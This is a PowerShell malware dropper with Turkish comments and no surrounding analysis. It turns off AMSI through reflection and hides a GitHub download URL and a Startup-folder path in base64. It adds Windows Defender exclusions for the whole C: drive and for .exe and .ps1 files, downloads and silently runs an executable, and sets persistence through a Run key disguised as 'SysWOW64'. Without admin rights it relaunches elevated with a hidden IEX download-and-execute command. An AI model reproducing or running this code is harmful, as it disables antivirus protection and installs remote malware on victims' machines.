# Yeni AMSI bypass (2024 imzasiz)
$z = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $z.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

# Base64 cozucu
function B($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}

$U = B("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZsZXhidXNpbmVzczMxLWRlc2lnbi94L3JlZnMvaGVhZHMvbWFpbi9NaWNyb3N5cy5leGU=")
$H = B("QzpcVXNlcnNc") + $env:USERNAME + B("XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcTWljcm9zeXMuZXhl")

function D($u,$h){
    try{
        $r = [Net.HttpWebRequest]::Create($u)
        $r.UserAgent = "Mozilla/5.0"
        $s = $r.GetResponse().GetResponseStream()
        $f = [IO.File]::Create($h)
        $s.CopyTo($f); $f.Close(); $s.Close()
        return $true
    }catch{return $false}
}

function E($p){
    $k = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    if(-not(Test-Path $k)){New-Item $k -Force -EA 0|Out-Null}
    New-ItemProperty $k -Name $p -Value 0 -PropertyType DWord -Force -EA 0|Out-Null
}
function E2($ext){
    $k = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
    if(-not(Test-Path $k)){New-Item $k -Force -EA 0|Out-Null}
    New-ItemProperty $k -Name $ext -Value 0 -PropertyType DWord -Force -EA 0|Out-Null
}
function R($x){
    $k = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $k -Name "SysWOW64" -Value $x -Force -EA 0
}

if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
    E "C:\"; E2 ".exe"; E2 ".ps1"
    if(D $U $H){
        R $H
        Start-Process $H -WindowStyle Hidden -EA 0
    }
} else {
    # Yonetici degilse UAC ile yeniden baslat
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('$U')\"""
}